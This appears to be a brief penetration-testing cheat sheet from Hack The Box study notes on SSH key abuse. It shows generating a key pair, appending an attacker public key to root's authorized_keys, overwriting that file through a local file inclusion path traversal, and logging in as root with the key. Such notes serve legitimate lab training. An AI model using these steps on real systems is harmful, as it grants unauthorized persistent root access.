# SSH KEYS
#overwrite_authorized_keys
```
ssh-keygen

cat fileup.pub > authorized_keys

LFI to overwrite ../../../../../../root/.ssh/authorized_keys
```

```shell-session
gyrsec@htb[/htb]$ ssh-keygen -f key

gyrsec@htb[/htb]$ cat ./key.pub

user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys

gyrsec@htb[/htb]$ ssh root@[ip] -i key
```

search .ssh directory